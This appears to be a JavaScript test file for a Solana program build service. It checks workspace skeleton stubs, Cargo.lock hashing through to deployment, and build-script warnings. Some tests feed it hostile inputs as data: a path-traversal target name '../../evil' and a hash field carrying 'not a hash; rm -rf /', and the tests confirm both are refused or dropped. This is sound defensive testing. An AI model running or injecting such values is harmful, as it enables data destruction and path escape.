  put("tools/cli/src/main.rs", "fn main() { real_code() }\n");
  const out = mkdtempSync(join(tmpdir(), "mynt-skel-out-"));
  const r = spawnSync("python3", ["-c", py, ws, out]);
  assert.equal(r.status, 0, r.stderr.toString());
  const files = [];
  const walk = (d) => readdirSync(d).forEach((f) => (statSync(join(d, f)).isDirectory() ? walk(join(d, f)) : files.push(relative(out, join(d, f)))));
  walk(out);
  assert.deepEqual(files.sort(), [
    "Cargo.toml",
    "programs/p/Cargo.toml",
    "programs/p/benches/speed.rs",
    "programs/p/examples/demo.rs",
    "programs/p/src/bin/admin-cli.rs",
    "programs/p/src/bin/p.rs",
    "programs/p/src/lib.rs",
    "programs/p/src/main.rs",
    "programs/p/tests/flow.rs",
    "tools/cli/Cargo.toml",
    "tools/cli/src/main.rs",
  ]);
  for (const f of files.filter((f) => f.endsWith(".rs"))) assert.equal(readFileSync(join(out, f), "utf8"), "", `${f} is an empty stub`);
  // A target whose name would be a path is refused.
  put("tools/cli/Cargo.toml", '[package]\nname = "cli"\nversion = "0.1.0"\n\n[[bin]]\nname = "../../evil"\n');
  const bad = spawnSync("python3", ["-c", py, ws, mkdtempSync(join(tmpdir(), "mynt-skel-out-"))]);
  assert.notEqual(bad.status, 0);
  assert.match(bad.stderr.toString(), /needs a plain name/);
});

test("the Cargo.lock each build compiled with is hashed, kept with its program, and shown on the program and its versions", async () => {
  const w = await world();
  const LOCK = "c".repeat(64);
  const code = w.program(2000);
  const boat = {
    async readFile(_id, path) {
      if (path.endsWith("/solana/programs.json"))
        return JSON.stringify([{ name: "mynt_program", size: code.length, sha256: executableHash(code), declared_id: null, cargo_lock_sha256: LOCK, cargo_lock_committed: false }]);
      if (path.endsWith("/solana/checks.jsonl")) return JSON.stringify({ name: "solana_build", status: "pass", detail: "built; warning: no Cargo.lock committed in solana - …" });
      return null;
    },
    async exec(_id, command) {
      const m = command.match(/tail -c \+(\d+) \S+ \| head -c (\d+) \| base64 -w0$/);
      return { exitCode: 0, stdout: Buffer.from(code.subarray(Number(m[1]) - 1, Number(m[1]) - 1 + Number(m[2]))).toString("base64"), stderr: "" };
    },
  };
  const builds = await BuildService.open(w.db, w.store, boat, null, buildConfigFromEnv({}));
  builds.solana = w.solana;
  const { program_id } = await w.ok(w.dev, "reserve_program_id", { name: "mynt_program", cluster: "devnet" });
  const id = await w.build();
  await builds.collectPrograms(await builds.get(id), "vm-verify");
  assert.equal((await w.solana.artifacts(id))[0].cargo_lock_sha256, LOCK);
  // The missing lock is a warning, not a failure.
  assert.equal((await builds.get(id)).solana_check.status, "pass");
  assert.match((await builds.get(id)).solana_check.detail, /no Cargo\.lock committed/);
  await w.db.query("UPDATE financial_products.solana_program_artifacts SET declared_id = $2 WHERE build_id = $1", [id, program_id]);
  await w.ok(w.dev, "deploy_program", { program_id, build_id: id });
  await w.solana.settled(program_id);
  const p = await w.ok(w.dev, "get_program", { program_id });
  assert.equal(p.status, "deployed", p.error);
  assert.equal(p.cargo_lock_sha256, LOCK);
  assert.equal(p.versions[0].cargo_lock_sha256, LOCK);
  assert.equal((await deliveries(w, "program.deployed"))[0].payload.data.cargo_lock_sha256, LOCK);
  // Anything but a sha256 isn't kept.
  const other = await w.build();
  await w.solana.recordArtifacts(other, [{ name: "x", declared_id: null, sha256: executableHash(code), size: code.length, program: code, idl: null, cargo_lock_sha256: "not a hash; rm -rf /" }]);
  assert.equal((await w.solana.artifacts(other))[0].cargo_lock_sha256, null);
});

test("the build records the Cargo.lock it used and warns, without failing, when none was committed", () => {
  const build = SOLANA_VERIFY_SCRIPT.slice(SOLANA_VERIFY_SCRIPT.indexOf('if [ "$MODE" = build ]'), SOLANA_VERIFY_SCRIPT.indexOf("# test:"));
  // The lock is read back from the stopped build container (the one the build used), as a regular file.
  const start = build.indexOf('docker start -a "$bcid"');
  const readLock = build.indexOf('docker cp -L "$cid:/workdir/Cargo.lock" "$lock"');
  assert.ok(start > 0 && readLock > start, "after the build");
  assert.match(build, /\[ -f "\$lock" \] && \[ ! -L "\$lock" \]/);
  assert.match(build, /"cargo_lock_sha256": lock_sha or None, "cargo_lock_committed": committed == "1"/);
  assert.match(build, /check "\$OUT\/checks\.jsonl" solana_build pass "[^"]*\$WARN"/, "the warning rides on a pass");
  assert.match(build, /warning: no Cargo\.lock committed in \$NO_LOCK/);
});
